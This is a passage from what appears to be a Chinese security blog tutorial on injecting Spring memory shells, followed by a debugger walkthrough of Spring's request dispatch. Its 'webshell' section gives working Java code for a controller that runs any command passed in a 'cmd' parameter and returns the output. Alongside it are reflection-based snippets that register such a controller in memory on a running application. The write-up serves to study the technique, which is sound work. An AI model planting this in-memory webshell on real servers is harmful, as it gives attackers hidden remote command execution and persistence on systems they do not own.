<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Method method = (Class.forName(&quot;com.example.demo.Test&quot;).getDeclaredMethods())[0];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 3. 定义访问 controller 的 URL 地址</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 5. 在内存中动态注册 controller</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r.registerMapping(info, Class.forName(&quot;com.example.demo.Test&quot;).newInstance(), method);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里只要让这些代码能够运行就行，我写到Controller里面的</p>
<p><img decoding="async" loading="lazy" alt="image-20211125104001877" src="/assets/images/image-20211125104001877-144273efa03e47b6af03ec177a6f96fe.png" width="3584" height="2240" class="img_ev3q"></p>
<p><code>com.example.demo.Test</code></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package com.example.demo;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletRequest;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletResponse;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Test {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void test(HttpServletRequest request, HttpServletResponse response) throws IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        response.getWriter().write(&quot;ADD CONTROLLER&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>效果</p>
<p><img decoding="async" loading="lazy" alt="image-20211125103648084" src="/assets/images/image-20211125103648084-80c75ae83cdf7f72d02df884cfa86f5a.png" width="976" height="200" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="方法二">方法二<!-- -->:registerHandler<a href="#方法二" class="hash-link" aria-label="方法二的直接链接" title="方法二的直接链接">​</a></h4>
<p>该方法接受 urlPath参数和 handler参数，可以在 <code>this.getApplicationContext()</code> 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中。</p>
<blockquote>
<p>我没成功，怀疑是spring版本问题</p>
</blockquote>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;com.example.demo.Test&quot;).newInstance());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 3. 反射获得 registerHandler Method</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">m1.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">m1.invoke(dh, &quot;/favicon&quot;, &quot;dynamicController&quot;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="方法三detecthandlermethods">方法三：detectHandlerMethods<a href="#方法三detecthandlermethods" class="hash-link" aria-label="方法三：detectHandlerMethods的直接链接" title="方法三：detectHandlerMethods的直接链接">​</a></h4>
<p>该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean。</p>
<blockquote>
<p>仍然没成功</p>
</blockquote>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;com.example.demo.Test&quot;).newInstance());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(&quot;detectHandlerMethods&quot;, Object.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">m1.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">m1.invoke(requestMappingHandlerMapping, &quot;dynamicController&quot;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="webshell">webshell<a href="#webshell" class="hash-link" aria-label="webshell的直接链接" title="webshell的直接链接">​</a></h3>
<p>就注入一个恶意的controller，然后这个controller中url对应的函数是执行命令的即可，简单示例</p>
<blockquote>
<p>主要是给路由和恶意方法绑定即可</p>
</blockquote>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// com.example.demo.Test</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">package com.example.demo;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletRequest;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletResponse;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.*;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Test {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void test(HttpServletRequest request, HttpServletResponse response) throws IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String cmd = request.getParameter(&quot;cmd&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if(cmd != null){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Process exec = Runtime.getRuntime().exec(cmd);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            InputStream inputStream = exec.getInputStream();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            DataInputStream dataInputStream = new DataInputStream(inputStream);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String disr = dataInputStream.readLine();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            while ( disr != null ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                response.getWriter().write(disr);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                disr = dataInputStream.readLine();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            response.getWriter().write(&quot;ADD CONTROLLER&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 注册Controller</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Method method = (Class.forName(&quot;com.example.demo.Test&quot;).getDeclaredMethods())[0];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 3. 定义访问 controller 的 URL 地址</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 5. 在内存中动态注册 controller</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r.registerMapping(info, Class.forName(&quot;com.example.demo.Test&quot;).newInstance(), method);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211125110430447" src="/assets/images/image-20211125110430447-c6a0d769a5946a07af3a6522b1aac9e9.png" width="1144" height="200" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注意事项">注意事项<a href="#注意事项" class="hash-link" aria-label="注意事项的直接链接" title="注意事项的直接链接">​</a></h3>
<p>不同的映射处理器</p>
<p>如下面的配置，当有些老旧的项目中使用旧式注解映射器时，上下文环境中没有 RequestMappingHandlerMapping 实例的 bean，但会存在 DefaultAnnotationHandlerMapping 的实例 bean。</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">bean</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">class</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">bean</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">class</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="springboot生命周期">SpringBoot生命周期<a href="#springboot生命周期" class="hash-link" aria-label="SpringBoot生命周期的直接链接" title="SpringBoot生命周期的直接链接">​</a></h2>
<p>上面过了一遍，感觉还是有点迷茫，可以调试一下spring的整个处理过程</p>
<p>一个请求到到应用层之前，需要经过那几个部分？是如何一步一步到到我们的Controller的?</p>
<p>编写一个正常的controller</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package com.example.demo;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.bind.annotation.GetMapping;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.bind.annotation.RequestMapping;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.bind.annotation.RestController;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@RestController</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@RequestMapping(&quot;/test&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class HelloController {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @GetMapping(&quot;/hello&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static String hello() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return &quot;123&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后下断点，观察整个流程，查看堆栈信息</p>
<div class="language-stack codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-stack codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hello:16, HelloController (com.example.demo)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:498, Method (java.lang.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doInvoke:197, InvocableHandlerMethod (org.springframework.web.method.support)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invokeForRequest:141, InvocableHandlerMethod (org.springframework.web.method.support)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invokeAndHandle:106, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invokeHandlerMethod:895, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doDispatch:1064, DispatcherServlet (org.springframework.web.servlet) ⭐️</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doService:963, DispatcherServlet (org.springframework.web.servlet)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">processRequest:1006, FrameworkServlet (org.springframework.web.servlet)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doGet:898, FrameworkServlet (org.springframework.web.servlet)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service:655, HttpServlet (javax.servlet.http)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service:883, FrameworkServlet (org.springframework.web.servlet)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service:764, HttpServlet (javax.servlet.http)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">internalDoFilter:228, ApplicationFilterChain (org.apache.catalina.core) 【5】</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilter:163, ApplicationFilterChain (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilter:53, WsFilter (org.apache.tomcat.websocket.server)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【4】</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilter:163, ApplicationFilterChain (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【3】</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilter:163, ApplicationFilterChain (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilterInternal:93, FormContentFilter (org.springframework.web.filter)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【2】</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilter:163, ApplicationFilterChain (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【1】</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doFilter:163, ApplicationFilterChain (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:202, StandardWrapperValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:97, StandardContextValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:542, AuthenticatorBase (org.apache.catalina.authenticator)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:143, StandardHostValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:92, ErrorReportValve (org.apache.catalina.valves)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:78, StandardEngineValve (org.apache.catalina.core)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service:357, CoyoteAdapter (org.apache.catalina.connector)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service:382, Http11Processor (org.apache.coyote.http11)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">process:65, AbstractProcessorLight (org.apache.coyote)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">process:893, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">doRun:1723, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run:748, Thread (java.lang)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以看到通过多次的<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>过滤处理后，会进入到调度方法<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>中</p>
<p>在调度方法中重新下断点，分析调度过程，执行到<code>getHandler</code>方法，从注释也可以看出来，是用来确定当前请求的处理程序，跟进</p>
<p><img decoding="async" loading="lazy" alt="image-20211124164243698" src="/assets/images/image-20211124164243698-9c0dd59427ccaf1699f32613658cd2ce.png" width="3584" height="2240" class="img_ev3q"></p>
<p>可以看到是遍历<code>this.handlerMappings</code> 这个迭代器中的<code>mapping</code>的<code>getHandler</code>方法处理http中的request请求</p>
<p>通过<code>requestMappingHandlerMapping</code>这个bean获取到了handler，但是怎么获取到的呢？我们继续跟进<code>getHandler</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211124165348461" src="/assets/images/image-20211124165348461-4c4929da1ada1d9038dae4ad0f2d3976.png" width="2634" height="1184" class="img_ev3q"></p>
<p>可以看到最后返回的是<code>executionChain</code>，也就是我们刚才的那个handler，这个变量是怎么得来的，继续跟<code>getHandlerExecutionChain()</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211124165652827" src="/assets/images/image-20211124165652827-c82541461377c6803e63290d3ccd11fe.png" width="3584" height="2240" class="img_ev3q"></p>
<p>在<code>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandlerExecutionChain</code>中把所有拦截器都加入到<code>chain</code>中并返回</p>
<p><img decoding="async" loading="lazy" alt="image-20211125084908387" src="/assets/images/image-20211125084908387-c7bd46454899739c37caabdb92f866e6.png" width="3584" height="2240" class="img_ev3q"></p>
<hr>
